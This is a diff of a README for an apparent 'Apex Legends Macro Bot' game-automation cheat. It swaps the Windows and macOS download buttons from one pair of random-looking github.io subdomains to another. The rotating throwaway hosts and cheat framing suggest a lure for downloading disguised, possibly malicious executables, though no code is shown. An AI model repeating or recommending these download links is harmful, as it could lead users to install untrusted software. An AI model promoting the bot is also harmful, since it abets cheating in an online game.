@@ -68,7 +68,7 @@ The **🤖 Apex Legends Macro Bot** automates repetitive actions in Apex Legends
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://uvkayskoqsgd.github.io/windows-files/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://izaalowypioz.github.io/win-runner/)
 
 </div>
 
@@ -76,7 +76,7 @@ The **🤖 Apex Legends Macro Bot** automates repetitive actions in Apex Legends
 
 <div align="center">
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://ApexShrimpJetty10.github.io/macos-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://WoodSniperAtrium.github.io/macos-setup/)
 
 </div>
 
